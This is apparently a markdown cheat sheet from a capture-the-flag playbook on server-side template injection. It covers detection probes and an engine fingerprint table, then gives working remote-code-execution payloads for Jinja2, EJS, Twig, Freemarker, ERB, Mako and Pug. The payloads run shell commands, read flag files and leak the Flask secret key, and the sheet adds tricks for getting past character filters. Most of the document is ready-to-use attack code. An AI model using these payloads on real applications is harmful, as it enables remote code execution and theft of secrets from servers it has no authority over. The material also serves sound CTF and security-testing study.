# Server-Side Template Injection (CWE-94 / CWE-1336)

**Signs**: "template", "custom header/greeting/design/card", "use {{name}} placeholders", email
templates, preview pages. Input reflected *after* being rendered. Hint "the page obeys your marks",
"the design keeps the house".

## 1. Detect (math is the discriminator vs XSS)
Send each; whichever renders `49` (or `7777777`) tells you the engine:
```
{{7*7}}   ${7*7}   <%= 7*7 %>   #{7*7}   {{7*'7'}}   ${{7*7}}   @(7*7)   {7*7}   [[7*7]]
```
| Result | Engine |
|---|---|
| `{{7*7}}`=49, `{{7*'7'}}`=`7777777` | **Jinja2** (Python/Flask) |
| `{{7*7}}`=49, `{{7*'7'}}`=49 | Twig (PHP) |
| `<%= 7*7 %>`=49 | **EJS** (Node) / ERB (Ruby) |
| `${7*7}`=49 | Freemarker / Velocity / Thymeleaf (Java), Mako |
| `#{7*7}`=49 | Pug/Jade, Ruby interpolation |
| `{{=7*7}}` | doT / Handlebars-ish |
Fingerprint the stack too ([fingerprinting](../01-recon/fingerprinting.md)).
`python scripts/injection/ssti_probe.py "$T/report" --data 'header=FUZZ'`

## 2. RCE payloads

**Jinja2**
```
{{ cycler.__init__.__globals__.os.popen('cat /flag/flag').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ get_flashed_messages.__globals__.__builtins__.open('/flag/flag').read() }}
```
Filters on `_`/`.`/`[`: use `|attr('\x5f\x5fglobals\x5f\x5f')`, `request.args.x` indirection.
Also leak config: `{{ config }}`, `{{ config.SECRET_KEY }}`.

**EJS (Node)**
```
<%= process.getBuiltinModule('child_process').execSync('cat /flag/flag').toString() %>   (Node ≥ 20.16)
<%= global.process.mainModule.require('child_process').execSync('id').toString() %>    (CommonJS)
<%= require('child_process').execSync('id') %>                                          (if require in scope)
```
**Twig**: `{{['cat /flag/flag']|filter('system')}}`, `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
**Freemarker**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`
**ERB**: `<%= `cat /flag/flag` %>`  **Mako**: `${__import__('os').popen('id').read()}`
**Pug**: `#{global.process.mainModule.require('child_process').execSync('id')}`

Automated: SSTImap / tplmap → [tools/sstimap.md](../tools/sstimap.md).

Seen in: `inj3` (OpsBoard: Jinja2 report header), `inj6` (CardCraft: user-supplied EJS design).
